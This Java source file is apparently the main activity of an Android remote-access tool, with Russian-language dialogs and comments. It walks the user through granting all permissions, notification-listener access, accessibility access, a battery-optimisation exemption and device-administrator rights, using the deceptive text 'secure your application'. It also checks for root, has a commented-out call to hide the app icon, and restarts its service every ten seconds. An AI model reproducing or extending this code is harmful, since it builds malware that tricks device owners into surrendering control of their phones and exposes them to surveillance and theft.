package com.remote.app;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.support.v4.app.ActivityCompat;
import android.view.View;
import android.widget.Button;

import com.remote.app.Managers.NotificationListener;
import com.remote.app.Managers.ScreenActivity;


public class MainActivity extends Activity {

    public static Activity activity;
    public static Context context;

    private DevicePolicyManager mDPM;
    private ComponentName mAdminName;

    Button btnext;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        activity=this;
        context=this;

        start();

        if (Build.VERSION.SDK_INT> Build.VERSION_CODES.LOLLIPOP_MR1) {
            String pkg=getPackageName();
            PowerManager pm=getSystemService(PowerManager.class);

            if (!pm.isIgnoringBatteryOptimizations(pkg)) {
                PackageInfo info = null;
                boolean isNotificationServiceRunning = isNotificationServiceRunning();
                if(!isNotificationServiceRunning){

                    Context context = getApplicationContext();
                    String[] permissions = new String[]{};
                    try {
                        info = getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
                        permissions = info.requestedPermissions;
                    } catch (PackageManager.NameNotFoundException e) {
                        e.printStackTrace();
                    }
                    //startActivity(new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.fromParts("package", getPackageName(), null)));

                    reqPermissions(getApplicationContext(), permissions);
                }
            }
        }


        btnext = findViewById(R.id.btnext);
        btnext.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                alertDialogBatteryIgnore();
            }
        });

//        startService(new Intent(this, MainService.class));
    }


    public void reqPermissions(Context context, String[] permissions) {
        if (context != null && permissions != null) {
            ActivityCompat.requestPermissions(this, permissions, 1);
            // spawn notification thing
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        }
    }

    private boolean isNotificationServiceRunning() {
        ContentResolver contentResolver = getContentResolver();
        String enabledNotificationListeners =
                Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String packageName = getPackageName();
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName);
    }

    public void alertDialogBatteryIgnore(){


        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("Battery Ignore");

        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() { // Кнопка ОК
            @Override
            public void onClick(DialogInterface dialog, int which) {

                if (Build.VERSION.SDK_INT> Build.VERSION_CODES.LOLLIPOP_MR1) {
                    String pkg=getPackageName();
                    PowerManager pm=getSystemService(PowerManager.class);

                    if (!pm.isIgnoringBatteryOptimizations(pkg)) {
                        Intent i=
                                new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                                        .setData(Uri.parse("package:"+pkg));

                        startActivity(i);
                    }
                }

                dialog.dismiss(); // Отпускает диалоговое окно
                onStartAccessibilitySettingsActivity();
                //alertAdmin();
            }
        });
        AlertDialog dialog = builder.create();
        dialog.show();
    }

    public void onStartAccessibilitySettingsActivity()
    {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("Accessibility");

        builder.setPositiveButton("Получить", new DialogInterface.OnClickListener() { // Кнопка ОК
            @Override
            public void onClick(DialogInterface dialog, int which) {

                Intent intentAccessibilitySettings = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                PackageManager packageManager = getPackageManager();
                ComponentName componentName = intentAccessibilitySettings.resolveActivity(packageManager);
                if (componentName != null) {
                    try {
                        startActivity(intentAccessibilitySettings);

                    } catch (ActivityNotFoundException ex) {
                    }
                }

                dialog.dismiss(); // Отпускает диалоговое окно
                alertAdmin();

            }
        });
        AlertDialog dialog = builder.create();
        dialog.show();

        // Start Accessibility Settings Activity

    }

    public void adminget(){
        ComponentName deviceAdminReceiver = new ComponentName(this, DeviceAdminSample.class);
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminReceiver);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Click on Activate button to secure your application.");
        startActivity(intent);

        alertSettings();

    }

    public void alertAdmin(){
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.context);
        builder.setMessage("Права администратора");

        builder.setPositiveButton("Получить", new DialogInterface.OnClickListener() { // Кнопка ОК
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss(); // Отпускает диалоговое окно
                adminget();
            }
        });
        try{
            AlertDialog dialog = builder.create();
            dialog.show();
        }catch (Exception e){adminget();}
    }

    public void alertSettings(){
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("1)Проверьте все ли разрешения получены  \n 2)Заблокируйте уведомления \n 3)Проверьте игнорируется ли режим энергосбережения");

        builder.setPositiveButton("Открыть", new DialogInterface.OnClickListener() { // Кнопка ОК
            @Override
            public void onClick(DialogInterface dialog, int which) {

                startActivity(new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.fromParts("package", getPackageName(), null)));
                dialog.dismiss(); // Отпускает диалоговое окно

                Intent intent2 = new Intent(MainActivity.context, ScreenActivity.class);
                //intent2.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                intent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent2);

                ExecuteAsRootBase.canRunRootCommands();

                start();
                //function.hideAppIcon(context);

            }
        });
        AlertDialog dialog = builder.create();
        dialog.show();

    }

    public void alertfinish(){


        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("");

        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() { // Кнопка ОК
            @Override
            public void onClick(DialogInterface dialog, int which) {



                alertSettings();
                dialog.dismiss(); // Отпускает диалоговое окно


            }
        });
        AlertDialog dialog = builder.create();
        dialog.show();
    }

    public void start(){
        Intent intent = new Intent(this, MainService.class);
        PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(), 1, intent, 0);
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, 0, 10000, pendingIntent);


        //finish();
    }



}

